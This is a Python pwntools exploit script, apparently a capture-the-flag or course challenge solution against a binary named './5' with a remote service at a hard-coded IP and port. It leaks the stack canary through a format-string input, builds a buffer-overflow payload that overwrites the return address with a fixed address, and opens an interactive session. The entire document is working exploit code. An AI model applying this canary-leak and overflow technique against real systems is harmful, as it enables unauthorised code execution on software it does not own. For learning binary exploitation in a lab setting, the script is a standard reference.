from pwn import * 

def conn(): 
    if args.GDB: 
        return gdb.debug('./5', 
        gdbscript="""
        init-pwndbg
        b *vuln+46
        b *vuln+63
        b *vuln+75
        continue
        """)  # Add necessary gdb commands here
    elif args.REMOTE: 
        return remote('52.184.85.16', 12345)
    else: 
        return process('./5')

def solve(): 
    p = conn()
    
    if(args.REMOTE):
        p.sendline("13523032")
        p.sendline("5")

    # write your payload here
    offset = 88

    # Leak canary value (17th on stack)
    log.info("Leaking the canary value...")
    p.sendline(b'%17$p')

    canary = None

    # Read the canary value
    try:
        log.info("Waiting for canary value...")
        canary_line = p.recvline(timeout=5).strip()

        # Extract the actual canary from the response
        match = re.search(rb'0x[0-9a-fA-F]+', canary_line)  # Use regex to find a hex value
        if match:
            canary = int(match.group(0), 16)  # Convert the matched hex string to an integer
            log.success(f"Leaked canary: {hex(canary)}")
        else:
            log.error(f"No valid canary found in line: {canary_line}")
            return

    except Exception as e:
        log.error(f"Failed to parse canary value: {e}")
        return

    payload = offset * b'A' + p64(canary) + b'B' * 8 + p64(0x40144c)
    print(payload)

    p.sendline(payload)  # Inject payload into binary
    p.interactive()  # Flush to stdout 

solve()
